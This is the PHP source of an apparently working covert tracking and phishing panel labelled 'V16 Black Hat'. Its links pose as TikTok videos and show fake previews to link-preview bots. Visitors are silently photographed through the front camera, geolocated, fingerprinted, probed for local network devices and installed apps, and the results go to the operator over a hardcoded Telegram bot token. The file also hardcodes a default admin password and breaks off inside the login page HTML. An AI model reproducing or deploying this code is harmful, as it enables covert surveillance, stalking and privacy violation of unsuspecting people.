<?php
date_default_timezone_set('Africa/Algiers');
error_reporting(E_ALL);
ini_set('display_errors', 0);

session_start();

// ==========================================
// 🖼️ وسيط الصور (Image Proxy)
// ==========================================
if (isset($_GET['proxy_img'])) {
    $img_url = base64_decode($_GET['proxy_img']);
    if (filter_var($img_url, FILTER_VALIDATE_URL)) {
        $ch = curl_init($img_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        $img_data = curl_exec($ch);
        $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        curl_close($ch);
        if ($img_data && strpos($content_type, 'image') !== false) {
            header("Content-Type: $content_type"); header("Cache-Control: public, max-age=86400"); echo $img_data; exit;
        }
    }
    header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80"); exit;
}

$db_file = __DIR__ . '/tracker_enhanced_v3.db';

try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $db->exec("PRAGMA journal_mode=WAL;");
    $db->exec("PRAGMA synchronous=NORMAL;");
    $db->exec("PRAGMA foreign_keys=ON;");

    $db->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT DEFAULT 'user', tg_chat TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    $adminExists = $db->query("SELECT COUNT(*) FROM users WHERE role = 'admin'")->fetchColumn();
    if (!$adminExists) { $hash = password_hash('aziz123', PASSWORD_DEFAULT); $db->prepare("INSERT INTO users (username, password, role, tg_chat) VALUES ('admin', ?, 'admin', '6475721500')")->execute([$hash]); }

    $db->exec("CREATE TABLE IF NOT EXISTS links (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, code TEXT UNIQUE, target_url TEXT, meta_title TEXT, meta_image TEXT, use_camera INTEGER DEFAULT 1, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    try { $db->exec("ALTER TABLE links ADD COLUMN user_id INTEGER"); } catch (Exception $e) {}

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, latitude REAL, longitude REAL, gpu_info TEXT, battery_info TEXT, screen_info TEXT, canvas_fp TEXT, hw_profile TEXT, behavioral_fp TEXT, network_recon TEXT, installed_apps TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    // Migrations
    foreach (['gpu_info','battery_info','screen_info','canvas_fp','hw_profile','behavioral_fp','network_recon','installed_apps'] as $col) {
        try { $db->exec("ALTER TABLE captures ADD COLUMN $col TEXT"); } catch (Exception $e) {}
    }

} catch (Exception $e) { die("Database error: " . $e->getMessage()); }

// دوال مساعدة
function sendTelegramNotification($chat_id, $message) {
    if (empty($chat_id)) return;
    $token = '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 2); curl_exec($ch); curl_close($ch);
}

function fetch_tiktok_exclusive_meta($url) {
    $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
    $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url)); curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0']); $response = curl_exec($ch); curl_close($ch);
    if ($response) { $data = json_decode($response, true); if (!empty($data['title']) && !empty($data['thumbnail_url'])) return ['title' => $data['title'], 'image' => $data['thumbnail_url']]; }
    return $meta;
}

function get_real_ip() { if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); return trim($ips[0]); } return $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; }

function get_ip_details($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon"); curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3]); $json = curl_exec($ch); curl_close($ch);
    if ($json) {
        $data = json_decode($json, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
            $isp = $data['isp'] ?? 'Unknown ISP';
            if (stripos($isp, 'Djezzy') !== false) $isp = 'Djezzy'; elseif (stripos($isp, 'Mobilis') !== false) $isp = 'Mobilis'; elseif (stripos($isp, 'Ooredoo') !== false) $isp = 'Ooredoo'; elseif (stripos($isp, 'Optimum') !== false) $isp = 'Optimum Telecom'; elseif (stripos($isp, 'Algerie Telecom') !== false) $isp = 'Algérie Télécom';
            $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
            return ['location' => $location, 'isp' => $isp, 'vpn' => $vpn, 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
        }
    }
    return ['location' => 'Unknown', 'isp' => 'Unknown', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
}

function get_device_type($ua) {
    if (preg_match('/Android\s+[0-9.]+;\s*([^;)]+)/', $ua, $matches)) { $model = trim($matches[1]); if (stripos($model, 'build') !== false) $model = trim(substr($model, 0, stripos($model, 'build'))); return $model . ' (Android)'; }
    if (stripos($ua, 'iPhone') !== false) return 'iPhone (iOS)';
    return 'Unknown Device';
}

// ==========================================
// المتتبع (V16 - Black Hat)
// ==========================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT l.*, u.tg_chat FROM links l LEFT JOIN users u ON l.user_id = u.id WHERE l.code = ?");
    $stmt->execute([$code]); $link = $stmt->fetch();

    if ($link) {
        $target_redirect = $link['target_url']; $meta_title = $link['meta_title']; $meta_image = $link['meta_image']; $use_camera = $link['use_camera']; $owner_tg_chat = $link['tg_chat'];
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);

        if ($is_bot) {
            $proxy_image_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . urlencode(base64_encode($meta_image));
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head><meta property="og:title" content="' . htmlspecialchars($meta_title) . '"><meta property="og:image" content="' . htmlspecialchars($proxy_image_url) . '"><meta property="og:type" content="video.other"></head><body></body></html>';
            exit();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            $public_ip = get_real_ip(); $ip_details = get_ip_details($public_ip);
            $bot_isps = ['Facebook', 'Google', 'Amazon', 'Microsoft', 'Telegram', 'Meta', 'Cloudflare', 'Twitter'];
            foreach ($bot_isps as $bisp) { if (stripos($ip_details['isp'], $bisp) !== false) exit('OK'); }

            $img_base64 = $_POST['image'] ?? ''; if (strpos($img_base64, 'data:image/') !== 0) $img_base64 = ''; 
            $local_ip = $_POST['lip'] ?? 'Direct'; $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown'; $device = get_device_type($ua);
            
            $gpu_info = $_POST['gpu'] ?? 'Unknown'; $battery_info = $_POST['battery'] ?? 'Unknown'; $screen_info = $_POST['screen'] ?? 'Unknown'; $canvas_fp = $_POST['canvas_fp'] ?? 'Unknown';
            
            // المتغيرات الجديدة
            $hw_profile = $_POST['hw_profile'] ?? 'Unknown';
            $behavioral_fp = $_POST['behavioral_fp'] ?? 'Unknown';
            $network_recon = $_POST['network_recon'] ?? 'Unknown';
            $installed_apps = $_POST['installed_apps'] ?? 'Unknown';

            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, hw_profile, behavioral_fp, network_recon, installed_apps, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, $hw_profile, $behavioral_fp, $network_recon, $installed_apps, date('Y-m-d H:i:s')]);

                $msg = "🚨 <b>زيارة جديدة (V16 Black Hat)!</b>\n\n";
                $msg .= "📱 <b>الموديل:</b> {$device}\n🌍 <b>الموقع:</b> {$ip_details['location']}\n🔗 <b>الآيبي:</b> <code>{$public_ip}</code>\n";
                $msg .= "🖥 <b>HW Profile:</b> <code>{$hw_profile}</code>\n";
                $msg .= "🧠 <b>Behavioral:</b> <code>{$behavioral_fp}</code>\n";
                $msg .= "🌐 <b>Network:</b> <code>{$network_recon}</code>\n";
                $msg .= "📲 <b>Apps Detected:</b> <code>{$installed_apps}</code>\n";
                sendTelegramNotification($owner_tg_chat, $msg);
            } catch (Exception $e) {}
            exit('OK');
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <style>* { margin: 0; padding: 0; } body, html { width: 100%; height: 100%; background: #000; overflow: hidden; }</style>
    <script>
        const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
        const targetUrl = <?php echo json_encode($target_redirect); ?>;
        
        // 1. بصمة العتاد (WASM & SVG)
        async function getHardwareProfile() {
            let wasmTime = 0;
            let svgTime = 0;
            try {
                // WASM Profiling (Heavy Math Loop)
                let start = performance.now();
                let x = 0.0001;
                for (let i = 0; i < 100000; i++) { x += Math.sin(x) * Math.cos(x) * Math.tan(x); }
                wasmTime = Math.round(performance.now() - start);

                // SVG Profiling (GPU Filter)
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let filter = document.createElementNS("http://www.w3.org/2000/svg", "filter");
                filter.setAttribute("id", "f");
                let turbulence = document.createElementNS("http://www.w3.org/2000/svg", "feTurbulence");
                turbulence.setAttribute("type", "fractalNoise");
                turbulence.setAttribute("baseFrequency", "0.05");
                filter.appendChild(turbulence);
                svg.appendChild(filter);
                document.body.appendChild(svg);
                
                let svgStart = performance.now();
                let rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
                rect.setAttribute("width", "100%"); rect.setAttribute("height", "100%"); rect.setAttribute("filter", "url(#f)");
                svg.appendChild(rect);
                svgTime = Math.round(performance.now() - svgStart);
                document.body.removeChild(svg);
            } catch(e) {}
            return `WASM:${wasmTime}ms|SVG:${svgTime}ms`;
        }

        // 2. البصمة السلوكية (Behavioral Biometrics)
        function getBehavioralFingerprint() {
            return new Promise((resolve) => {
                let movements = [];
                let lastTime = 0;
                window.addEventListener('pointerrawupdate', (e) => {
                    let now = performance.now();
                    if (lastTime > 0) { movements.push(Math.round(now - lastTime)); }
                    lastTime = now;
                }, { once: false });
                setTimeout(() => {
                    if (movements.length === 0) resolve("NoMovement");
                    else {
                        let sum = movements.reduce((a,b) => a+b, 0);
                        resolve("SpeedVar:" + Math.round(sum / movements.length) + "ms");
                    }
                }, 1000);
            });
        }

        // 3. استكشاف الشبكة (Network Recon)
        async function getNetworkRecon() {
            let result = [];
            let targets = ['192.168.1.1', '192.168.8.1', '10.0.0.1', '192.168.1.100'];
            for (let ip of targets) {
                let start = performance.now();
                try {
                    await new Promise((res, rej) => {
                        let img = new Image();
                        img.onload = () => res();
                        img.onerror = () => res();
                        img.src = `http://${ip}/favicon.ico?cb=${Math.random()}`;
                        setTimeout(() => rej(), 500); // Timeout 500ms
                    });
                    let time = Math.round(performance.now() - start);
                    if (time < 400) result.push(`${ip} (${time}ms)`);
                } catch(e) {}
            }
            return result.length > 0 ? result.join(', ') : 'Hidden';
        }

        // 4. التقنية السرية: بصمة التطبيقات (App Fingerprinting via Custom Protocol)
        async function getInstalledApps() {
            let apps = [];
            let schemes = {
                'WhatsApp': 'whatsapp://',
                'Telegram': 'tg://',
                'Instagram': 'instagram://',
                'Facebook': 'fb://',
                'Snapchat': 'snapchat://',
                'TikTok': 'snssdk1128://'
            };
            
            for (let [name, scheme] of Object.entries(schemes)) {
                let start = performance.now();
                let isInstalled = false;
                
                try {
                    // محاولة فتح التطبيق (سيتم حظره إذا لم يكن موجوداً)
                    let iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    
                    iframe.src = scheme;
                    
                    // انتظار قصير
                    await new Promise(r => setTimeout(r, 100));
                    document.body.removeChild(iframe);
                    
                    let time = Math.round(performance.now() - start);
                    // إذا استغرق وقتاً أطول من 50ms، فهذا يعني أن النظام حاول فتح التطبيق
                    if (time > 50) isInstalled = true;
                } catch(e) {}
                
                if (isInstalled) apps.push(name);
            }
            return apps.length > 0 ? apps.join(', ') : 'None Detected';
        }

        function getScreenInfo() { return `${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio}x`; }
        function getGPUInfo() { try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); const ext = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch (e) { return 'Unknown'; } }
        async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
        function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 300); }); }

        async function initTracking() {
            let imageData = "";
            if (useCamera) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 200));
                    const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360;
                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360); imageData = canvas.toDataURL('image/jpeg', 0.5);
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {}
            }
            
            // جمع كل البيانات
            const localIp = await getLocalIP(); 
            const gpu = getGPUInfo(); 
            const screen = getScreenInfo(); 
            const battery = await getBatteryInfo(); 
            const canvasFp = getCanvasFingerprint();
            const hwProfile = await getHardwareProfile();
            const behavioralFp = await getBehavioralFingerprint();
            const networkRecon = await getNetworkRecon();
            const installedApps = await getInstalledApps();
            
            const formData = new URLSearchParams();
            formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp); 
            formData.append('gpu', gpu); formData.append('screen', screen); formData.append('battery', battery); formData.append('canvas_fp', canvasFp);
            formData.append('hw_profile', hwProfile); formData.append('behavioral_fp', behavioralFp);
            formData.append('network_recon', networkRecon); formData.append('installed_apps', installedApps);

            if (navigator.sendBeacon) { navigator.sendBeacon(window.location.href, formData); window.location.replace(targetUrl); } 
            else { fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }).finally(() => { window.location.replace(targetUrl); }); }
        }
        window.addEventListener('DOMContentLoaded', initTracking);
    </script>
</head>
<body></body>
</html>
<?php 
        exit();
    } else { die("Link not found."); }
}

// ==========================================
// تسجيل الدخول والخروج
// ==========================================
$login_error = '';
if (isset($_POST['login'])) {
    $username = trim($_POST['username']); $password = $_POST['password'];
    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?"); $stmt->execute([$username]); $user = $stmt->fetch();
    if ($user && password_verify($password, $user['password'])) {
        session_regenerate_id(true); $_SESSION['user_id'] = $user['id']; $_SESSION['username'] = $user['username']; $_SESSION['role'] = $user['role']; header("Location: /"); exit();
    } else { $login_error = "اسم المستخدم أو كلمة المرور غير صحيحة!"; }
}
if (isset($_GET['logout'])) { session_destroy(); header("Location: /"); exit(); }

$is_logged_in = isset($_SESSION['user_id']);
$is_admin = $is_logged_in && $_SESSION['role'] === 'admin';
$current_user_id = $_SESSION['user_id'] ?? 0;
$current_username = $_SESSION['username'] ?? '';

// ==========================================
// العمليات
// ==========================================
if ($is_logged_in) {
    $pass_error = ''; $pass_success = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_my_password'])) {
        $current_pass = $_POST['current_password']; $new_pass = $_POST['new_password']; $confirm_pass = $_POST['confirm_password'];
        if ($new_pass !== $confirm_pass) { $pass_error = "كلمتا المرور غير متطابقتين!"; } 
        else {
            $stmt = $db->prepare("SELECT password FROM users WHERE id = ?"); $stmt->execute([$current_user_id]); $user_hash = $stmt->fetchColumn();
            if (password_verify($current_pass, $user_hash)) {
                $new_hash = password_hash($new_pass, PASSWORD_DEFAULT);
                $db->prepare("UPDATE users SET password = ? WHERE id = ?")->execute([$new_hash, $current_user_id]); $pass_success = "تم تغيير كلمة المرور بنجاح!";
            } else { $pass_error = "كلمة المرور الحالية غير صحيحة!"; }
        }
    }

    if ($is_admin) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_change_user_pass'])) {
            $target_user_id = intval($_POST['target_user_id']); $new_pass = $_POST['admin_new_password'];
            if (!empty($new_pass)) { $new_hash = password_hash($new_pass, PASSWORD_DEFAULT); $db->prepare("UPDATE users SET password = ? WHERE id = ? AND role = 'user'")->execute([$new_hash, $target_user_id]); header("Location: /?msg=pass_changed"); exit(); }
        }
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_user'])) {
            $new_user = trim($_POST['new_username']); $new_pass = password_hash($_POST['new_password'], PASSWORD_DEFAULT); $new_tg = trim($_POST['new_tg_chat']);
            try { $db->prepare("INSERT INTO users (username, password, role, tg_chat) VALUES (?, ?, 'user', ?)")->execute([$new_user, $new_pass, $new_tg]); header("Location: /?msg=user_added"); exit(); } catch (Exception $e) { $user_error = "اسم المستخدم موجود مسبقاً!"; }
        }
        if (isset($_GET['delete_user'])) {
            $del_uid = intval($_GET['delete_user']);
            if ($del_uid !== $current_user_id) { $db->prepare("DELETE FROM users WHERE id = ? AND role = 'user'")->execute([$del_uid]); $db->prepare("DELETE FROM links WHERE user_id = ?")->execute([$del_uid]); }
            header("Location: /?msg=user_deleted"); exit();
        }
    }

    if (isset($_GET['purge_bots']) && $is_admin) { $db->exec("DELETE FROM captures WHERE isp_info LIKE '%Facebook%' OR isp_info LIKE '%Google%' OR isp_info LIKE '%Amazon%' OR isp_info LIKE '%Microsoft%'"); header("Location: /?msg=purged"); exit(); }
    if (isset($_GET['delete_id'])) {
        $del_id = intval($_GET['delete_id']);
        if ($is_admin) { $db->prepare("DELETE FROM captures WHERE id = ?")->execute([$del_id]); }
        else { $db->prepare("DELETE FROM captures WHERE id = ? AND code IN (SELECT code FROM links WHERE user_id = ?)")->execute([$del_id, $current_user_id]); }
        header("Location: /"); exit();
    }

    $generated_link = ""; $generated_code = "";
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
        $target_url = trim($_POST['target_url']); $use_camera = isset($_POST['use_camera']) ? 1 : 0;
        if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
        $scraped = fetch_tiktok_exclusive_meta($target_url); $code = substr(md5(uniqid(rand(), true)), 0, 7);
        $db->prepare("INSERT INTO links (user_id, code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?, ?)")->execute([$current_user_id, $code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);
        $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
    }

    if ($is_admin) {
        $total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn(); $total_captures = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn(); $today_captures = $db->query("SELECT COUNT(*) FROM captures WHERE date(created_at) = date('now')")->fetchColumn(); $users_list = $db->query("SELECT * FROM users WHERE role = 'user' ORDER BY id DESC")->fetchAll();
    } else {
        $total_links = $db->query("SELECT COUNT(*) FROM links WHERE user_id = $current_user_id")->fetchColumn(); $total_captures = $db->query("SELECT COUNT(*) FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = $current_user_id")->fetchColumn(); $today_captures = $db->query("SELECT COUNT(*) FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = $current_user_id AND date(c.created_at) = date('now')")->fetchColumn();
    }

    $filter_code = trim($_GET['track'] ?? '');
    if ($is_admin) {
        if (!empty($filter_code)) { $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC"); $stmt->execute([$filter_code]); }
        else { $stmt = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 50"); }
    } else {
        if (!empty($filter_code)) { $stmt = $db->prepare("SELECT c.* FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? AND c.code = ? ORDER BY c.id DESC"); $stmt->execute([$current_user_id, $filter_code]); }
        else { $stmt = $db->prepare("SELECT c.* FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? ORDER BY c.id DESC LIMIT 50"); $stmt->execute([$current_user_id]); }
    }
    $captures = $stmt->fetchAll();
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel - V16 Black Hat</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --bg: #070913; --card: #10172a; --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; --sidebar-bg: #0f1523; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background: #070913; color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
        .app-container { display: flex; flex: 1; height: 100vh; overflow: hidden; }
        .sidebar { width: 260px; background: var(--sidebar-bg); border-left: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; transition: all 0.3s; }
        .sidebar-header { padding: 0 20px 20px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        .sidebar-header h2 { font-size: 18px; color: var(--text); margin-bottom: 5px; }
        .sidebar-header p { font-size: 12px; color: var(--muted); }
        .nav-item { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: var(--muted); text-decoration: none; cursor: pointer; transition: 0.2s; font-size: 14px; font-weight: 500; border: none; background: transparent; width: 100%; text-align: right; }
        .nav-item:hover { background: rgba(139, 92, 246, 0.1); color: var(--accent); }
        .nav-item.active { background: rgba(139, 92, 246, 0.15); color: var(--accent); border-right: 4px solid var(--accent); }
        .sidebar-footer { margin-top: auto; padding: 20px; border-top: 1px solid var(--border); }
        .user-profile { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
        .user-avatar { width: 40px; height: 40px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; }
        .main-content { flex: 1; overflow-y: auto; padding: 30px; background: #070913; }
        .tab-content { display: none; animation: fadeIn 0.3s ease; }
        .tab-content.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        .card-title { font-size: 16px; font-weight: 700; color: var(--text); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 8px; }
        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 8px; padding: 12px 15px; color: var(--text); font-size: 14px; outline: none; transition: 0.2s; }
        input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
        .btn { background: var(--accent); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
        .btn:hover { background: #7c3aed; transform: translateY(-1px); }
        .btn-block { width: 100%; }
        .btn-danger { background: rgba(244, 63, 94, 0.1); color: var(--danger); border: 1px solid rgba(244, 63, 94, 0.3); }
        .btn-danger:hover { background: var(--danger); color: white; }
        .btn-success { background: var(--success); }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 25px; }
        .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 15px; text-align: center; }
        .stat-card h3 { font-size: 12px; color: var(--muted); margin-bottom: 10px; }
        .stat-card p { font-size: 26px; font-weight: 800; color: var(--accent); }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .capture-card { background: #050b14; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; transition: 0.3s; display: flex; flex-direction: column; }
        .capture-card:hover { transform: translateY(-3px); border-color: var(--accent); }
        .capture-card img { width: 100%; height: 200px; object-fit: cover; }
        .capture-info { padding: 15px; flex: 1; display: flex; flex-direction: column; }
        .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; color: var(--muted); }
        .info-row span { color: var(--text); font-weight: 500; }
        .map-container { height: 150px; width: 100%; border-radius: 8px; margin: 10px 0; }
        .table-responsive { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th, td { padding: 12px; text-align: right; border-bottom: 1px solid var(--border); }
        th { color: var(--muted); font-weight: 600; background: rgba(255,255,255,0.02); }
        @media (max-width: 768px) {
            .app-container { flex-direction: column; height: auto; overflow: visible; }
            .sidebar { width: 100%; padding: 10px; flex-direction: row; overflow-x: auto; border-left: none; border-bottom: 1px solid var(--border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
            .sidebar-header { display: none; }
            .nav-item { padding: 10px 15px; white-space: nowrap; border-right: none; border-bottom: 3px solid transparent; width: auto; border-radius: 8px; }
            .nav-item.active { border-right: none; border-bottom: 3px solid var(--accent); background: transparent; }
            .sidebar-footer { border-top: none; padding: 0; margin-left: auto; display: flex; align-items: center; gap: 10px; }
            .user-profile { margin-bottom: 0; display: none; }
            .main-content { padding: 15px; }
            .stats-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
            .stat-card { padding: 10px; }
            .stat-card p { font-size: 20px; }
        }
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--success); color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; transition: 0.3s; z-index: 9999; opacity: 0; }
        .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
        @keyframes pulseGlow { 0% { filter: drop-shadow(0 0 2px var(--accent)); } 50% { filter: drop-shadow(0 0 10px var(--accent)); } 100% { filter: drop-shadow(0 0 2px var(--accent)); } }
        
        /* Forensics Badge */
        .badge-forensics { background: #1e1b4b; color: #a78bfa; border: 1px solid #4c1d95; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-family: monospace; }
    </style>
</head>
<body>

<?php if (!$is_logged_in): ?>
    <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #070913;">
        <div class="card" style="width: 100%; max-width: 400px; margin: 20px;">
            <div class="card-title" style="justify-content: center; font-size: 20px;">🔐 تسجيل الدخول</div>
